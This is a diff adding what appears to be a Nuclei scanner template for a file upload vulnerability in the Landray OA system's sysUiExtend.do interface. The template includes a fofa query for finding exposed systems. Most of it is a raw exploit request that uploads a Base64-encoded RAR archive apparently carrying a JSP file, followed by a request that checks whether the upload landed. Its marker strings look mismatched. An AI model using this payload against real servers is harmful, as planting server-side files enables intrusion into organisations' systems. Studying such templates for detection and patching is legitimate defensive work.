@@ -1,0 +1,43 @@
+id: landray-oa-sysuiextenddo-file-upload
+
+info:
+  name: 蓝凌OA sysUiExtend.do 接口文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="Landray-OA系统"
+          蓝凌智能OA系统集成了钉钉的数字化功能，面向中小企业提供移动办公解决方案，涵盖日常办公、企业文化、客户管理、人事服务及行政服务等模块。
+  tags: 蓝凌OA
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=getThemeInfo HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=---------------------------260140030128010173621878123124
+    Accept: application/json, text/javascript, */*; q=0.01
+    X-Requested-With: XMLHttpRequest
+     
+    -----------------------------260140030128010173621878123124
+    Content-Disposition: form-data; name="file"; filename="NTest.rar"
+    Content-Type: application/octet-stream
+     
+    $<Base64File>UmFyIRoHAM+QcwAADQAAAAAAAAAFrXQgkCsAJgAAACoAAAACq5hOpWltPVgdMwYAIAAAAHVpLmluaQCw74hIDQEI/oy3slUlTFs/5KYBiA/xEkER2fNZBwSC6Qd6bqnGj8r6/SDk1nQgkDEAHQAAAB0AAAACVj9xGIVtPVgdMAwAIAAAAGR1ZGVzaXRlLmpzcACwGnREPCUgb3V0LnByaW50bG4oImR1ZGVzaXRlIik7JT7EPXsAQAcA</Base64File>$
+    -----------------------------260140030128010173621878123124--
+- raw:
+  - |
+    GET /resource/ui-ext/NdayPoc/NTest.rar HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
